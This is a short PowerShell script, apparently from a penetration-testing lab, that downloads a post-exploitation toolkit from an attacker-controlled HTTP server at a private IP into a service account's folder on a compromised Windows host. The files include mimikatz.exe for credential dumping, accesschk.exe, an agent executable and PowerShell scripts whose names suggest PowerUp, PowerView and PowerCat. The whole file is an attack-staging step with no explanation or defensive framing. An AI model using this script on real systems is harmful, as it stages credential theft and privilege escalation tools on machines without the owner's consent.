$baseUrl = "http://192.168.45.224:8000/"
$fileNames = ("pu.ps1", "pv.ps1","pc.ps1", "mimikatz.exe", "accesschk.exe","agent.exe","gp4.exe")
$downloadPath = "C:\users\web_svc"
foreach ($fileName in $fileNames) 
{
	$url = $baseUrl + $fileName
	$filePath = Join-Path $downloadPath $fileName
	Invoke-WebRequest -uri $url -OutFile $filePath
	Write-Host "Downloaded $fileName to $filePath"
}
